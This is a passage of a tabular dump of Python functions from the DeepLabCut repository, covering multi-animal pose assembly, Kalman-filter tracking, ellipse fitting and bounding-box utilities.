                (d, _) = tree.query(vecs)
                dists.append(np.exp(-self._gamma * n * d))
            w = np.mean(dists, axis=0)
            aff *= w.reshape(aff.shape)
        if self.greedy:
            conf = np.asarray([[det_s.confidence * det_t.confidence for det_t in dets_t] for det_s in dets_s])
            (rows, cols) = np.where((conf >= self.pcutoff * self.pcutoff) & (aff >= self.min_affinity))
            candidates = sorted(zip(rows, cols, aff[rows, cols], lengths[rows, cols]), key=lambda x: x[2], reverse=True)
            i_seen = set()
            j_seen = set()
            for (i, j, w, l) in candidates:
                if i not in i_seen and j not in j_seen:
                    i_seen.add(i)
                    j_seen.add(j)
                    links.append(Link(dets_s[i], dets_t[j], w))
                    if len(i_seen) == self.max_n_individuals:
                        break
        else:
            inds_s = sorted(range(len(dets_s)), key=lambda x: dets_s[x].confidence, reverse=True)[:self.max_n_individuals]
            inds_t = sorted(range(len(dets_t)), key=lambda x: dets_t[x].confidence, reverse=True)[:self.max_n_individuals]
            keep_s = [ind for ind in inds_s if dets_s[ind].confidence >= self.pcutoff]
            keep_t = [ind for ind in inds_t if dets_t[ind].confidence >= self.pcutoff]
            aff = aff[np.ix_(keep_s, keep_t)]
            (rows, cols) = linear_sum_assignment(aff, maximize=True)
            for (row, col) in zip(rows, cols):
                w = aff[row, col]
                if w >= self.min_affinity:
                    links.append(Link(dets_s[keep_s[row]], dets_t[keep_t[col]], w))
    return links"
AlexEMG/DeepLabCut,_fill_assembly,"def _fill_assembly(self, assembly, lookup, assembled, safe_edge, nan_policy):
    stack = []
    visited = set()
    tabu = []
    counter = itertools.count()

    def push_to_stack(i):
        for (j, link) in lookup[i].items():
            if j in assembly._idx:
                continue
            if link.idx in visited:
                continue
            heapq.heappush(stack, (-link.affinity, next(counter), link))
            visited.add(link.idx)
    for idx in assembly._idx:
        push_to_stack(idx)
    while stack and len(assembly) < self.n_multibodyparts:
        (_, _, best) = heapq.heappop(stack)
        (i, j) = best.idx
        if i in assembly._idx:
            new_ind = j
        elif j in assembly._idx:
            new_ind = i
        else:
            continue
        if new_ind in assembled:
            continue
        if safe_edge:
            d_old = self.calc_assembly_mahalanobis_dist(assembly, nan_policy=nan_policy)
            success = assembly.add_link(best, store_dict=True)
            if not success:
                assembly._dict = dict()
                continue
            d = self.calc_assembly_mahalanobis_dist(assembly, nan_policy=nan_policy)
            if d < d_old:
                push_to_stack(new_ind)
                try:
                    (_, _, link) = heapq.heappop(tabu)
                    heapq.heappush(stack, (-link.affinity, next(counter), link))
                except IndexError:
                    pass
            else:
                heapq.heappush(tabu, (d - d_old, next(counter), best))
                assembly.__dict__.update(assembly._dict)
            assembly._dict = dict()
        else:
            assembly.add_link(best)
            push_to_stack(new_ind)"
AlexEMG/DeepLabCut,build_assemblies,"def build_assemblies(self, links):
    lookup = defaultdict(dict)
    for link in links:
        (i, j) = link.idx
        lookup[i][j] = link
        lookup[j][i] = link
    assemblies = []
    assembled = set()
    G = nx.Graph([link.idx for link in links])
    for chain in nx.connected_components(G):
        if len(chain) == self.n_multibodyparts:
            edges = [tuple(sorted(edge)) for edge in G.edges(chain)]
            assembly = Assembly(self.n_multibodyparts)
            for link in links:
                (i, j) = link.idx
                if (i, j) in edges:
                    success = assembly.add_link(link)
                    if success:
                        lookup[i].pop(j)
                        lookup[j].pop(i)
            assembled.update(assembly._idx)
            assemblies.append(assembly)
    if len(assemblies) == self.max_n_individuals:
        return (assemblies, assembled)
    for link in sorted(links, key=lambda x: x.affinity, reverse=True):
        if any((i in assembled for i in link.idx)):
            continue
        assembly = Assembly(self.n_multibodyparts)
        assembly.add_link(link)
        self._fill_assembly(assembly, lookup, assembled, self.safe_edge, self.nan_policy)
        for link in assembly._links:
            (i, j) = link.idx
            lookup[i].pop(j)
            lookup[j].pop(i)
        assembled.update(assembly._idx)
        assemblies.append(assembly)
    n_extra = len(assemblies) - self.max_n_individuals
    if n_extra > 0:
        if self.safe_edge:
            ds_old = [self.calc_assembly_mahalanobis_dist(assembly) for assembly in assemblies]
            while len(assemblies) > self.max_n_individuals:
                ds = []
                for (i, j) in itertools.combinations(range(len(assemblies)), 2):
                    if assemblies[j] not in assemblies[i]:
                        temp = assemblies[i] + assemblies[j]
                        d = self.calc_assembly_mahalanobis_dist(temp)
                        delta = d - max(ds_old[i], ds_old[j])
                        ds.append((i, j, delta, d, temp))
                if not ds:
                    break
                min_ = sorted(ds, key=lambda x: x[2])
                (i, j, delta, d, new) = min_[0]
                if delta < 0 or len(min_) == 1:
                    assemblies[i] = new
                    assemblies.pop(j)
                    ds_old[i] = d
                    ds_old.pop(j)
                else:
                    break
        elif self.force_fusion:
            assemblies = sorted(assemblies, key=len)
            for nrow in range(n_extra):
                assembly = assemblies[nrow]
                candidates = [a for a in assemblies[nrow:] if assembly not in a]
                if not candidates:
                    continue
                if len(candidates) == 1:
                    candidate = candidates[0]
                else:
                    dists = []
                    for cand in candidates:
                        d = cdist(assembly.xy, cand.xy)
                        dists.append(np.nanmin(d))
                    candidate = candidates[np.argmin(dists)]
                ind = assemblies.index(candidate)
                assemblies[ind] += assembly
        else:
            store = dict()
            for assembly in assemblies:
                if len(assembly) != self.n_multibodyparts:
                    for i in assembly._idx:
                        store[i] = assembly
            used = [link for assembly in assemblies for link in assembly._links]
            unconnected = [link for link in links if link not in used]
            for link in unconnected:
                (i, j) = link.idx
                try:
                    if store[j] not in store[i]:
                        temp = store[i] + store[j]
                        store[i].__dict__.update(temp.__dict__)
                        assemblies.remove(store[j])
                        for idx in store[j]._idx:
                            store[idx] = store[i]
                except KeyError:
                    pass
    for assembly in assemblies:
        if len(assembly) != self.n_multibodyparts:
            self._fill_assembly(assembly, lookup, assembled, False, '')
            assembled.update(assembly._idx)
    return (assemblies, assembled)"
AlexEMG/DeepLabCut,_assemble,"def _assemble(self, data_dict, ind_frame):
    joints = list(self._flatten_detections(data_dict))
    if not joints:
        return (None, None)
    bag = defaultdict(list)
    for joint in joints:
        bag[joint.label].append(joint)
    assembled = set()
    if self.n_uniquebodyparts:
        unique = np.full((self.n_uniquebodyparts, 3), np.nan)
        for (n, ind) in enumerate(range(self.n_multibodyparts, self.n_keypoints)):
            dets = bag[ind]
            if not dets:
                continue
            if len(dets) > 1:
                det = max(dets, key=lambda x: x.confidence)
            else:
                det = dets[0]
            assembled.update((d.idx for d in dets))
            if det.confidence <= self.pcutoff and (not self.add_discarded):
                continue
            unique[n] = (*det.pos, det.confidence)
        if np.isnan(unique).all():
            unique = None
    else:
        unique = None
    if not any((i in bag for i in range(self.n_multibodyparts))):
        return (None, unique)
    if self.n_multibodyparts == 1:
        assemblies = []
        for joint in bag[0]:
            if joint.confidence >= self.pcutoff:
                ass = Assembly(self.n_multibodyparts)
                ass.add_joint(joint)
                assemblies.append(ass)
        return (assemblies, unique)
    if self.max_n_individuals == 1:
        get_attr = operator.attrgetter('confidence')
        ass = Assembly(self.n_multibodyparts)
        for ind in range(self.n_multibodyparts):
            joints = bag[ind]
            if not joints:
                continue
            ass.add_joint(max(joints, key=get_attr))
        return ([ass], unique)
    if self.identity_only:
        assemblies = []
        get_attr = operator.attrgetter('group')
        temp = sorted((joint for joint in joints if np.isfinite(joint.confidence)), key=get_attr)
        groups = itertools.groupby(temp, get_attr)
        for (_, group) in groups:
            ass = Assembly(self.n_multibodyparts)
            for joint in sorted(group, key=lambda x: x.confidence, reverse=True):
                if joint.confidence >= self.pcutoff and joint.label < self.n_multibodyparts:
                    ass.add_joint(joint)
            if len(ass):
                assemblies.append(ass)
                assembled.update(ass._idx)
    else:
        trees = []
        for j in range(1, self.window_size + 1):
            tree = self._trees.get(ind_frame - j, None)
            if tree is not None:
                trees.append(tree)
        links = self.extract_best_links(bag, data_dict['costs'], trees)
        if self._kde:
            for link in links[::-1]:
                p = max(self.calc_link_probability(link), 0.001)
                link.affinity *= p
                if link.affinity < self.min_affinity:
                    links.remove(link)
        if self.window_size >= 1 and links:
            vecs = np.vstack([link.to_vector() for link in links])
            self._trees[ind_frame] = cKDTree(vecs)
        (assemblies, assembled_) = self.build_assemblies(links)
        assembled.update(assembled_)
    discarded = set((joint for joint in joints if joint.idx not in assembled and np.isfinite(joint.confidence)))
    for assembly in assemblies[::-1]:
        if 0 < assembly.n_links < self.min_n_links or not len(assembly):
            for link in assembly._links:
                discarded.update((link.j1, link.j2))
            assemblies.remove(assembly)
    if 0 < self.max_overlap < 1:
        if self._kde is not None:
            scores = [-self.calc_assembly_mahalanobis_dist(ass) for ass in assemblies]
        else:
            scores = [ass._affinity for ass in assemblies]
        lst = list(zip(scores, assemblies))
        assemblies = []
        while lst:
            temp = max(lst, key=lambda x: x[0])
            lst.remove(temp)
            assemblies.append(temp[1])
            for pair in lst[::-1]:
                if temp[1].intersection_with(pair[1]) >= self.max_overlap:
                    lst.remove(pair)
    if len(assemblies) > self.max_n_individuals:
        assemblies = sorted(assemblies, key=len, reverse=True)
        for assembly in assemblies[self.max_n_individuals:]:
            for link in assembly._links:
                discarded.update((link.j1, link.j2))
        assemblies = assemblies[:self.max_n_individuals]
    if self.add_discarded and discarded:
        for joint in sorted(discarded, key=lambda x: x.confidence, reverse=True):
            if self.safe_edge:
                for assembly in assemblies:
                    if joint.label in assembly._visible:
                        continue
                    d_old = self.calc_assembly_mahalanobis_dist(assembly)
                    assembly.add_joint(joint)
                    d = self.calc_assembly_mahalanobis_dist(assembly)
                    if d < d_old:
                        break
                    assembly.remove_joint(joint)
            else:
                dists = []
                for (i, assembly) in enumerate(assemblies):
                    if joint.label in assembly._visible:
                        continue
                    d = cdist(assembly.xy, np.atleast_2d(joint.pos))
                    dists.append((i, np.nanmin(d)))
                if not dists:
                    continue
                min_ = sorted(dists, key=lambda x: x[1])
                (ind, _) = min_[0]
                assemblies[ind].add_joint(joint)
    return (assemblies, unique)"
AlexEMG/DeepLabCut,assemble,"def assemble(self, chunk_size=1, n_processes=None):
    self.assemblies = dict()
    self.unique = dict()
    if chunk_size == 0 or multiprocessing.get_start_method() == 'spawn':
        for (i, data_dict) in enumerate(tqdm(self)):
            (assemblies, unique) = self._assemble(data_dict, i)
            if assemblies:
                self.assemblies[i] = assemblies
            if unique is not None:
                self.unique[i] = unique
    else:
        global wrapped

        def wrapped(i):
            return (i, self._assemble(self[i], i))
        n_frames = len(self.metadata['imnames'])
        with multiprocessing.Pool(n_processes) as p:
            with tqdm(total=n_frames) as pbar:
                for (i, (assemblies, unique)) in p.imap_unordered(wrapped, range(n_frames), chunksize=chunk_size):
                    if assemblies:
                        self.assemblies[i] = assemblies
                    if unique is not None:
                        self.unique[i] = unique
                    pbar.update()"
AlexEMG/DeepLabCut,from_pickle,"def from_pickle(self, pickle_path):
    with open(pickle_path, 'rb') as file:
        data = pickle.load(file)
    self.unique = data.pop('single', {})
    self.assemblies = data"
AlexEMG/DeepLabCut,parse_metadata,"@staticmethod
def parse_metadata(data):
    params = dict()
    params['joint_names'] = data['metadata']['all_joints_names']
    params['num_joints'] = len(params['joint_names'])
    params['paf_graph'] = data['metadata']['PAFgraph']
    params['paf'] = data['metadata'].get('PAFinds', np.arange(len(params['joint_names'])))
    params['bpts'] = params['ibpts'] = range(params['num_joints'])
    params['imnames'] = [fn for fn in list(data) if fn != 'metadata']
    return params"
AlexEMG/DeepLabCut,to_h5,"def to_h5(self, output_name):
    data = np.full((len(self.metadata['imnames']), self.max_n_individuals, self.n_multibodyparts, 4), fill_value=np.nan)
    for (ind, assemblies) in self.assemblies.items():
        for (n, assembly) in enumerate(assemblies):
            data[ind, n] = assembly.data
    index = pd.MultiIndex.from_product([['scorer'], map(str, range(self.max_n_individuals)), map(str, range(self.n_multibodyparts)), ['x', 'y', 'likelihood']], names=['scorer', 'individuals', 'bodyparts', 'coords'])
    temp = data[..., :3].reshape((data.shape[0], -1))
    df = pd.DataFrame(temp, columns=index)
    df.to_hdf(output_name, key='ass')"
AlexEMG/DeepLabCut,to_pickle,"def to_pickle(self, output_name):
    data = dict()
    for (ind, assemblies) in self.assemblies.items():
        data[ind] = [ass.data for ass in assemblies]
    if self.unique:
        data['single'] = self.unique
    with open(output_name, 'wb') as file:
        pickle.dump(data, file, pickle.HIGHEST_PROTOCOL)"
AlexEMG/DeepLabCut,push_to_stack,"def push_to_stack(i):
    for (j, link) in lookup[i].items():
        if j in assembly._idx:
            continue
        if link.idx in visited:
            continue
        heapq.heappush(stack, (-link.affinity, next(counter), link))
        visited.add(link.idx)"
AlexEMG/DeepLabCut,wrapped,"def wrapped(i):
    return (i, self._assemble(self[i], i))"
AlexEMG/DeepLabCut,calc_iou,"def calc_iou(bbox1, bbox2):
    x1 = max(bbox1[0], bbox2[0])
    y1 = max(bbox1[1], bbox2[1])
    x2 = min(bbox1[2], bbox2[2])
    y2 = min(bbox1[3], bbox2[3])
    w = max(0, x2 - x1)
    h = max(0, y2 - y1)
    wh = w * h
    return wh / ((bbox1[2] - bbox1[0]) * (bbox1[3] - bbox1[1]) + (bbox2[2] - bbox2[0]) * (bbox2[3] - bbox2[1]) - wh)"
AlexEMG/DeepLabCut,fill_tracklets,"def fill_tracklets(tracklets, trackers, animals, imname):
    for content in trackers:
        (tracklet_id, pred_id) = content[-2:].astype(int)
        if tracklet_id not in tracklets:
            tracklets[tracklet_id] = {}
        if pred_id != -1:
            tracklets[tracklet_id][imname] = animals[pred_id]
        else:
            xy = np.asarray(content[:-2])
            pred = np.insert(xy, range(2, len(xy) + 1, 2), 1)
            tracklets[tracklet_id][imname] = pred"
AlexEMG/DeepLabCut,calc_bboxes_from_keypoints,"def calc_bboxes_from_keypoints(data, slack=0, offset=0):
    data = np.asarray(data)
    if data.shape[-1] < 3:
        raise ValueError('Data should be of shape (n_animals, n_bodyparts, 3)')
    if data.ndim != 3:
        data = np.expand_dims(data, axis=0)
    bboxes = np.full((data.shape[0], 5), np.nan)
    bboxes[:, :2] = np.nanmin(data[..., :2], axis=1) - slack
    bboxes[:, 2:4] = np.nanmax(data[..., :2], axis=1) + slack
    bboxes[:, -1] = np.nanmean(data[..., 2])
    bboxes[:, [0, 2]] += offset
    return bboxes"
AlexEMG/DeepLabCut,reconstruct_all_ellipses,"def reconstruct_all_ellipses(data, sd):
    xy = data.droplevel('scorer', axis=1).drop('likelihood', axis=1, level=-1)
    if 'single' in xy:
        xy.drop('single', axis=1, level='individuals', inplace=True)
    animals = xy.columns.get_level_values('individuals').unique()
    nrows = xy.shape[0]
    ellipses = np.full((len(animals), nrows, 5), np.nan)
    fitter = EllipseFitter(sd)
    for (n, animal) in enumerate(animals):
        data = xy.xs(animal, axis=1, level='individuals').values.reshape((nrows, -1, 2))
        for (i, coords) in enumerate(tqdm(data)):
            el = fitter.fit(coords.astype(np.float64))
            if el is not None:
                ellipses[n, i] = el.parameters
    return ellipses"
AlexEMG/DeepLabCut,_track_individuals,"def _track_individuals(individuals, min_hits=1, max_age=5, similarity_threshold=0.6, track_method='ellipse'):
    if track_method not in TRACK_METHODS:
        raise ValueError(f'Unknown {track_method} tracker.')
    if track_method == 'ellipse':
        tracker = SORTEllipse(max_age, min_hits, similarity_threshold)
    elif track_method == 'box':
        tracker = SORTBox(max_age, min_hits, similarity_threshold)
    else:
        n_bodyparts = individuals[0][0].shape[0]
        tracker = SORTSkeleton(n_bodyparts, max_age, min_hits, similarity_threshold)
    tracklets = defaultdict(dict)
    all_hyps = dict()
    for (i, (multi, single)) in enumerate(tqdm(individuals)):
        if single is not None:
            tracklets['single'][i] = single
        if multi is None:
            continue
        if track_method == 'box':
            xy = calc_bboxes_from_keypoints(multi)
        else:
            xy = multi[..., :2]
        hyps = tracker.track(xy)
        all_hyps[i] = hyps
        for hyp in hyps:
            (tracklet_id, pred_id) = hyp[-2:].astype(int)
            if pred_id != -1:
                tracklets[tracklet_id][i] = multi[pred_id]
    return (tracklets, all_hyps)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, dim, dim_z):
    self.kf = kinematic_kf(dim, 1, dim_z=dim_z, order_by_dim=False)
    self.id = self.__class__.n_trackers
    self.__class__.n_trackers += 1
    self.time_since_update = 0
    self.age = 0
    self.hits = 0
    self.hit_streak = 0"
AlexEMG/DeepLabCut,update,"def update(self, z):
    self.time_since_update = 0
    self.hits += 1
    self.hit_streak += 1
    self.kf.update(z)"
AlexEMG/DeepLabCut,predict,"def predict(self):
    self.kf.predict()
    self.age += 1
    if self.time_since_update > 0:
        self.hit_streak = 0
    self.time_since_update += 1
    return self.state"
AlexEMG/DeepLabCut,state,"@property
def state(self):
    return self.kf.x.squeeze()[:self.kf.dim_z]"
AlexEMG/DeepLabCut,state,"@state.setter
def state(self, state):
    self.kf.x[:self.kf.dim_z] = state"
AlexEMG/DeepLabCut,__init__,"def __init__(self, x, y, width, height, theta):
    self.x = x
    self.y = y
    self.width = width
    self.height = height
    self.theta = theta
    self._geometry = None"
AlexEMG/DeepLabCut,parameters,"@property
def parameters(self):
    return (self.x, self.y, self.width, self.height, self.theta)"
AlexEMG/DeepLabCut,aspect_ratio,"@property
def aspect_ratio(self):
    return max(self.width, self.height) / min(self.width, self.height)"
AlexEMG/DeepLabCut,calc_similarity_with,"def calc_similarity_with(self, other_ellipse):
    max_dist = max(self.height, self.width, other_ellipse.height, other_ellipse.width)
    dist = math.sqrt((self.x - other_ellipse.x) ** 2 + (self.y - other_ellipse.y) ** 2)
    cost1 = 1 - min(dist / max_dist, 1)
    cost2 = abs(math.cos(self.theta - other_ellipse.theta))
    return 0.8 * cost1 + 0.2 * cost2 * cost1"
AlexEMG/DeepLabCut,contains_points,"def contains_points(self, xy, tol=0.1):
    ca = math.cos(self.theta)
    sa = math.sin(self.theta)
    x_demean = xy[:, 0] - self.x
    y_demean = xy[:, 1] - self.y
    return (ca * x_demean + sa * y_demean) ** 2 / (0.5 * self.width) ** 2 + (sa * x_demean - ca * y_demean) ** 2 / (0.5 * self.height) ** 2 <= 1 + tol"
AlexEMG/DeepLabCut,draw,"def draw(self, show_axes=True, ax=None, **kwargs):
    import matplotlib.pyplot as plt
    from matplotlib.lines import Line2D
    from matplotlib.transforms import Affine2D
    if ax is None:
        ax = plt.subplot(111, aspect='equal')
    el = patches.Ellipse(xy=(self.x, self.y), width=self.width, height=self.height, angle=np.rad2deg(self.theta), **kwargs)
    ax.add_patch(el)
    if show_axes:
        major = Line2D([-self.width / 2, self.width / 2], [0, 0], lw=3, zorder=3)
        minor = Line2D([0, 0], [-self.height / 2, self.height / 2], lw=3, zorder=3)
        trans = Affine2D().rotate(self.theta).translate(self.x, self.y) + ax.transData
        major.set_transform(trans)
        minor.set_transform(trans)
        ax.add_artist(major)
        ax.add_artist(minor)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, sd=2):
    self.sd = sd
    self.x = None
    self.y = None
    self.params = None
    self._coeffs = None"
AlexEMG/DeepLabCut,fit,"def fit(self, xy):
    (self.x, self.y) = xy[np.isfinite(xy).all(axis=1)].T
    if len(self.x) < 3:
        return None
    if self.sd:
        self.params = self._fit_error(self.x, self.y, self.sd)
    else:
        self._coeffs = self._fit(self.x, self.y)
        self.params = self.calc_parameters(self._coeffs)
    if not np.isnan(self.params).any():
        el = Ellipse(*self.params)
        return el
    return None"
AlexEMG/DeepLabCut,_fit,"@staticmethod
@jit(nopython=True)
def _fit(x, y):
    """"""
        Least Squares ellipse fitting algorithm
        Fit an ellipse to a set of X- and Y-coordinates.
        See Halir and Flusser, 1998 for implementation details

        :param x: ndarray, 1D trajectory
        :param y: ndarray, 1D trajectory
        :return: 1D ndarray of 6 coefficients of the general quadratic curve:
            ax^2 + 2bxy + cy^2 + 2dx + 2fy + g = 0
        """"""
    D1 = np.vstack((x * x, x * y, y * y))
    D2 = np.vstack((x, y, np.ones_like(x)))
    S1 = D1 @ D1.T
    S2 = D1 @ D2.T
    S3 = D2 @ D2.T
    T = -np.linalg.inv(S3) @ S2.T
    temp = S1 + S2 @ T
    M = np.zeros_like(temp)
    M[0] = temp[2] * 0.5
    M[1] = -temp[1]
    M[2] = temp[0] * 0.5
    (E, V) = np.linalg.eig(M)
    cond = 4 * V[0] * V[2] - V[1] ** 2
    a1 = V[:, cond > 0][:, 0]
    a2 = T @ a1
    return np.hstack((a1, a2))"
AlexEMG/DeepLabCut,_fit_error,"@staticmethod
@jit(nopython=True)
def _fit_error(x, y, sd):
    """"""
        Fit a sd-sigma covariance error ellipse to the data.

        :param x: ndarray, 1D input of X coordinates
        :param y: ndarray, 1D input of Y coordinates
        :param sd: int, size of the error ellipse in 'standard deviation'
        :return: ellipse center, semi-axes length, angle to the X-axis
        """"""
    cov = np.cov(x, y)
    (E, V) = np.linalg.eigh(cov)
    (height, width) = 2 * sd * np.sqrt(E)
    (a, b) = V[:, 1]
    rotation = math.atan2(b, a) % np.pi
    return [np.mean(x), np.mean(y), width, height, rotation]"
AlexEMG/DeepLabCut,calc_parameters,"@staticmethod
@jit(nopython=True)
def calc_parameters(coeffs):
    """"""
        Calculate ellipse center coordinates, semi-axes lengths, and
        the counterclockwise angle of rotation from the x-axis to the ellipse major axis.
        Visit http://mathworld.wolfram.com/Ellipse.html
        for how to estimate ellipse parameters.

        :param coeffs: list of fitting coefficients
        :return: center: 1D ndarray, semi-axes: 1D ndarray, angle: float
        """"""
    (a, b, c, d, f, g) = coeffs
    b *= 0.5
    d *= 0.5
    f *= 0.5
    x0 = (c * d - b * f) / (b * b - a * c)
    y0 = (a * f - b * d) / (b * b - a * c)
    num = 2 * (a * f * f + c * d * d + g * b * b - 2 * b * d * f - a * c * g)
    den1 = (b * b - a * c) * (np.sqrt((a - c) ** 2 + 4 * b * b) - (a + c))
    den2 = (b * b - a * c) * (-np.sqrt((a - c) ** 2 + 4 * b * b) - (a + c))
    major = np.sqrt(num / den1)
    minor = np.sqrt(num / den2)
    if b == 0:
        if a < c:
            phi = 0
        else:
            phi = np.pi / 2
    elif a < c:
        phi = np.arctan(2 * b / (a - c)) / 2
    else:
        phi = np.pi / 2 + np.arctan(2 * b / (a - c)) / 2
    return [x0, y0, 2 * major, 2 * minor, phi]"
AlexEMG/DeepLabCut,__init__,"def __init__(self, params):
    super().__init__(dim=5, dim_z=5)
    self.kf.R[2:, 2:] *= 10.0
    self.kf.P[5:, 5:] *= 1000.0
    self.kf.P *= 10.0
    self.kf.Q[5:, 5:] *= 0.01
    self.state = params"
AlexEMG/DeepLabCut,state,"@BaseTracker.state.setter
def state(self, params):
    state = np.asarray(params).reshape((-1, 1))
    super(EllipseTracker, type(self)).state.fset(self, state)"
AlexEMG/DeepLabCut,__init__,"def __init__(self, n_bodyparts):
    super().__init__(dim=n_bodyparts * 2, dim_z=n_bodyparts)
    self.kf.Q[self.kf.dim_z:, self.kf.dim_z:] *= 10
    self.kf.R[self.kf.dim_z:, self.kf.dim_z:] *= 0.01
    self.kf.P[self.kf.dim_z:, self.kf.dim_z:] *= 1000"
AlexEMG/DeepLabCut,update,"def update(self, pose):
    flat = pose.reshape((-1, 1))
    empty = np.isnan(flat).squeeze()
    if empty.any():
        H = self.kf.H.copy()
        H[empty] = 0
        flat[empty] = 0
        self.kf.update(flat, H=H)
    else:
        super().update(flat)"
AlexEMG/DeepLabCut,state,"@BaseTracker.state.setter
def state(self, pose):
    curr_pose = pose.copy()
    empty = np.isnan(curr_pose).all(axis=1)
    if empty.any():
        fill = np.nanmean(pose, axis=0)
        curr_pose[empty] = fill
    super(SkeletonTracker, type(self)).state.fset(self, curr_pose.reshape((-1, 1)))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, bbox):
    super().__init__(dim=4, dim_z=4)
    self.kf = KalmanFilter(dim_x=7, dim_z=4)
    self.kf.F = np.array([[1, 0, 0, 0, 1, 0, 0], [0, 1, 0, 0, 0, 1, 0], [0, 0, 1, 0, 0, 0, 1], [0, 0, 0, 1, 0, 0, 0], [0, 0, 0, 0, 1, 0, 0], [0, 0, 0, 0, 0, 1, 0], [0, 0, 0, 0, 0, 0, 1]])
    self.kf.H = np.array([[1, 0, 0, 0, 0, 0, 0], [0, 1, 0, 0, 0, 0, 0], [0, 0, 1, 0, 0, 0, 0], [0, 0, 0, 1, 0, 0, 0]])
    self.kf.R[2:, 2:] *= 10.0
    self.kf.P[4:, 4:] *= 1000.0
    self.kf.P *= 10.0
    self.kf.Q[-1, -1] *= 0.01
    self.kf.Q[4:, 4:] *= 0.01
    self.state = bbox"
AlexEMG/DeepLabCut,update,"def update(self, bbox):
    super().update(self.convert_bbox_to_z(bbox))"
AlexEMG/DeepLabCut,predict,"def predict(self):
    if self.kf.x[6] + self.kf.x[2] <= 0:
        self.kf.x[6] *= 0.0
    return super().predict()"
AlexEMG/DeepLabCut,state,"@property
def state(self):
    return self.convert_x_to_bbox(self.kf.x)[0]"
AlexEMG/DeepLabCut,state,"@state.setter
def state(self, bbox):
    state = self.convert_bbox_to_z(bbox)
    super(BoxTracker, type(self)).state.fset(self, state)"
AlexEMG/DeepLabCut,convert_x_to_bbox,"@staticmethod
def convert_x_to_bbox(x, score=None):
    """"""
        Takes a bounding box in the centre form [x,y,s,r] and returns it in the form
        [x1,y1,x2,y2] where x1,y1 is the top left and x2,y2 is the bottom right
        """"""
    w = np.sqrt(x[2] * x[3])
    h = x[2] / w
    if score is None:
        return np.array([x[0] - w / 2.0, x[1] - h / 2.0, x[0] + w / 2.0, x[1] + h / 2.0]).reshape((1, 4))
    else:
        return np.array([x[0] - w / 2.0, x[1] - h / 2.0, x[0] + w / 2.0, x[1] + h / 2.0, score]).reshape((1, 5))"
AlexEMG/DeepLabCut,convert_bbox_to_z,"@staticmethod
def convert_bbox_to_z(bbox):
    """"""
        Takes a bounding box in the form [x1,y1,x2,y2] and returns z in the form
        [x,y,s,r] where x,y is the centre of the box and s is the scale/area and r is
        the aspect ratio
        """"""
    w = bbox[2] - bbox[0]
    h = bbox[3] - bbox[1]
    x = bbox[0] + w / 2.0
    y = bbox[1] + h / 2.0
    s = w * h
    r = w / float(h)
    return np.array([x, y, s, r]).reshape((4, 1))"
AlexEMG/DeepLabCut,__init__,"def __init__(self):
    self.n_frames = 0
    self.trackers = []"
AlexEMG/DeepLabCut,track,"@abc.abstractmethod
def track(self):
    pass"
AlexEMG/DeepLabCut,__init__,"def __init__(self, max_age, min_hits, iou_threshold, sd=2):
    self.max_age = max_age
    self.min_hits = min_hits
    self.iou_threshold = iou_threshold
    self.fitter = EllipseFitter(sd)
    EllipseTracker.n_trackers = 0
    super().__init__()"
AlexEMG/DeepLabCut,track,"def track(self, poses, identities=None):
    self.n_frames += 1
    trackers = np.zeros((len(self.trackers), 6))
    for i in range(len(trackers)):
        trackers[i, :5] = self.trackers[i].predict()
    empty = np.isnan(trackers).any(axis=1)
    trackers = trackers[~empty]
    for ind in np.flatnonzero(empty)[::-1]:
        self.trackers.pop(ind)
    ellipses = []
    pred_ids = []
    for (i, pose) in enumerate(poses):
        el = self.fitter.fit(pose)
        if el is not None:
            ellipses.append(el)
            if identities is not None:
                pred_ids.append(mode(identities[i])[0][0])
    if not len(trackers):
        matches = np.empty((0, 2), dtype=int)
        unmatched_detections = np.arange(len(ellipses))
        unmatched_trackers = np.empty((0, 6), dtype=int)
    else:
        ellipses_trackers = [Ellipse(*t[:5]) for t in trackers]
        cost_matrix = np.zeros((len(ellipses), len(ellipses_trackers)))
        for (i, el) in enumerate(ellipses):
            for (j, el_track) in enumerate(ellipses_trackers):
                cost = el.calc_similarity_with(el_track)
                if identities is not None:
                    match = 2 if pred_ids[i] == self.trackers[j].id_ else 1
                    cost *= match
                cost_matrix[i, j] = cost
        (row_indices, col_indices) = linear_sum_assignment(cost_matrix, maximize=True)
        unmatched_detections = [i for (i, _) in enumerate(ellipses) if i not in row_indices]
        unmatched_trackers = [j for (j, _) in enumerate(trackers) if j not in col_indices]
        matches = []
        for (row, col) in zip(row_indices, col_indices):
            val = cost_matrix[row, col]
            if val < self.iou_threshold:
                unmatched_detections.append(row)
                unmatched_trackers.append(col)
            else:
                matches.append([row, col])
        if not len(matches):
            matches = np.empty((0, 2), dtype=int)
        else:
            matches = np.stack(matches)
        unmatched_trackers = np.asarray(unmatched_trackers)
        unmatched_detections = np.asarray(unmatched_detections)
    animalindex = []
    for (t, tracker) in enumerate(self.trackers):
        if t not in unmatched_trackers:
            ind = matches[matches[:, 1] == t, 0][0]
            animalindex.append(ind)
            tracker.update(ellipses[ind].parameters)
        else:
            animalindex.append(-1)
    for i in unmatched_detections:
        trk = EllipseTracker(ellipses[i].parameters)
        if identities is not None:
            trk.id_ = mode(identities[i])[0][0]
        self.trackers.append(trk)
        animalindex.append(i)
    i = len(self.trackers)
    ret = []
    for trk in reversed(self.trackers):
        d = trk.state
        if trk.time_since_update < 1 and (trk.hit_streak >= self.min_hits or self.n_frames <= self.min_hits):
            ret.append(np.concatenate((d, [trk.id, int(animalindex[i - 1])])).reshape(1, -1))
        i -= 1
        if trk.time_since_update > self.max_age:
            self.trackers.pop(i)
    if len(ret) > 0:
        return np.concatenate(ret)
    return np.empty((0, 7))"
AlexEMG/DeepLabCut,__init__,"def __init__(self, n_bodyparts, max_age=20, min_hits=3, oks_threshold=0.5):
    self.n_bodyparts = n_bodyparts
    self.max_age = max_age
    self.min_hits = min_hits
    self.oks_threshold = oks_threshold
    SkeletonTracker.n_trackers = 0
    super().__init__()"
AlexEMG/DeepLabCut,weighted_hausdorff,"@staticmethod
def weighted_hausdorff(x, y):
    cmax = 0
    for i in range(x.shape[0]):
        no_break_occurred = True
        cmin = np.inf
        for j in range(y.shape[0]):
            d = (x[i, 0] - y[j, 0]) ** 2 + (x[i, 1] - y[j, 1]) ** 2
            if d < cmax:
                no_break_occurred = False
                break
            if d < cmin:
                cmin = d
        if cmin != np.inf and cmin > cmax and no_break_occurred:
            cmax = cmin
    return np.sqrt(cmax)"
